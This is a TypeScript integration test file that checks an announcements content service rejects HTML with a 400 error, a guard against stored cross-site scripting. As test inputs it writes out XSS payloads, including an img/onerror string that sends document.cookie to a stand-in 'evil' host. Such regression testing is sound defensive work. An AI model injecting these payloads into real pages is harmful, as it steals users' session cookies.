/**
 * Security issue #1 - stored XSS guard at the service write path.
 *
 * Integration counterpart of tests/unit/announcement-xss.test.ts: the
 * plain-text guard runs inside createContentItem / updateContentItem for
 * every content collection, so HTML payloads are rejected with a 400
 * problem before they can be stored. Exercised through the same service
 * the API routes delegate to.
 */

import { afterAll, afterEach, beforeAll, describe, expect, test } from "bun:test";
import { updateContentItem } from "@/lib/services/content";
import { createContentApiFixtures } from "./helpers";

const { uniqueSuffix, expectApiError, trackCreate, setup, cleanupRows, teardown, actor } =
  createContentApiFixtures();

let actorId = "";

beforeAll(async () => {
  actorId = await setup();
});

afterEach(cleanupRows);

afterAll(teardown);

describe("content write path rejects HTML (stored-XSS guard)", () => {
  test("create rejects the issue #1 img/onerror payload", async () => {
    await expectApiError(
      () =>
        trackCreate("announcements", {
          title: `XSS attempt ${uniqueSuffix()}`,
          content: "<img src=x onerror=fetch('https://evil/?c='+document.cookie)>",
          status: "draft",
          visibility: "public",
        }),
      400,
      "bad-request",
    );
  });

  test("create rejects a script tag", async () => {
    await expectApiError(
      () =>
        trackCreate("announcements", {
          title: `Script attempt ${uniqueSuffix()}`,
          content: "<script>alert(document.cookie)</script>",
          status: "draft",
          visibility: "public",
        }),
      400,
      "bad-request",
    );
  });

  test("update rejects HTML in content while other fields still update", async () => {
    const suffix = uniqueSuffix();
    const announcement = await trackCreate("announcements", {
      title: `Update guard ${suffix}`,
      content: "Plain text body for the update guard test.",
      status: "draft",
      visibility: "public",
    });

    await expectApiError(
      () =>
        updateContentItem(
          "announcements",
          announcement.id as string,
          { content: "<svg onload=alert(1)>" },
          actor,
        ),
      400,
      "bad-request",
    );

    // The failed attempt must not have corrupted the row.
    const updated = await updateContentItem(
      "announcements",
      announcement.id as string,
      { isUrgent: true },
      actor,
    );
    expect(updated.isUrgent).toBe(true);
    expect(updated.content).toBe("Plain text body for the update guard test.");
  });

  test("plain-text content still round-trips", async () => {
    const suffix = uniqueSuffix();
    const announcement = await trackCreate("announcements", {
      title: `Plain round-trip ${suffix}`,
      content: "Maintenance window Saturday 14:00-16:00. Expect brief downtime.",
      status: "draft",
      visibility: "public",
    });
    expect(announcement.content).toBe(
      "Maintenance window Saturday 14:00-16:00. Expect brief downtime.",
    );
  });
});
